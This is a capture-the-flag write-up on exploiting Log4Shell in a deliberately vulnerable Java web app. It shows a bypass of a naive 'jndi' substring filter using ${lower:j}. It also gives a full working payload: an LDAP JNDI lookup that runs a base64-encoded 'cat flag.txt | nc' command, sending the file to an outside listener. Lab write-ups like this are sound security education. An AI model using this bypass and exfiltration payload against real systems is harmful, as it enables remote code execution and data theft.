# CTF League - log4coffee

## log4shell
For this challenge, we were tasked with exploiting a critical vulnerability in the Java logging framework `log4j`. As logs are often used to record user input, sanitizing the logs user input is rather important. However, log4j allowed inputs to include the `$jndi`, a powerful tool that allows you to remotely load and execute classes, reach out to remote servers, and more.  

## Exploit
For this challenge, we had a malicous LDAP server at our dispoal, running [JNDI Exploit](https://web.archive.org/web/20211211083908/https://github.com/feihong-cs/JNDIExploit), as well as the vulnerable website. Investigating the source of the website, anything provided with the comments field in the `/order` route will be logged.

```java
@PostMapping("/order")
public String orderUp(@ModelAttribute OrderForm order, Model model){
String comments = order.getComments();

String response;

// ok fixed log4shell vuln, app is now secure.
if (!(comments.contains("jndi"))){
    ByteArrayOutputStream baos = new ByteArrayOutputStream();
    PrintStream ps = new PrintStream(baos);
    PrintStream old = System.out;
    System.setOut(ps);
    logger.info(String.format(">>> Order ID: %d, QTY: %d, Notes: %s", orderID.incrementAndGet(), order.getQty(), comments));
    System.out.flush();
    System.setOut(old);
    response = baos.toString().split(">>>", 2)[1];
} else {
    response = "Haha! Nice try hacker--but my web-application is *super secure*!";
}

return response;
}
```

As the code comment notes, they attempted to secure their app, by restricting any request that contained the substring `jndi`, but simply combining another method such as`${lower:<str>}`, we can evade that check and still evaluate jndi requests with `${${lower:j}ndi:<request>}`   

The way our malicious LDAP server would work is when queried by it would return an http response containing our payload, that when deserialized by the java application would be executed. The JNDIExploit server contains dozens of methods that could be useful in an attack, we chose to use the Base64 encoded command which used route `<ldap-server>/Basic/Command/Base64/<base64-cmd>`.
 
The next challenge was determining what to send as our payload, while the code we submitted would be executed on the server, we didn't have access to the output, which meant we would need to setup a listening server and pipe the output to that server. We setup a listening server on the engineering flip servers with `nc`, and configured our payload to print the output of a file `flag.txt` to our server as such:
```sh
cat flag.txt | nc flip4.engr.oregonstate.edu 2222

Y2F0IGZsYWcudHh0IHwgbmMgZmxpcDQuZW5nci5vcmVnb25zdGF0ZS5lZHUgMjIyMg==
```
With our payload configured and listening server setup. we created our final JNDI request, that we could send in the comments of the `/order` route, which granted the flag.  
```
${${lower:j}ndi:ldap://log4j.ctf-league.osusec.org:1389/Basic/Command/Base64/Y2F0IGZsYWcudHh0IHwgbmMgZmxpcDQuZW5nci5vcmVnb25zdGF0ZS5lZHUgMjIyMg==}
```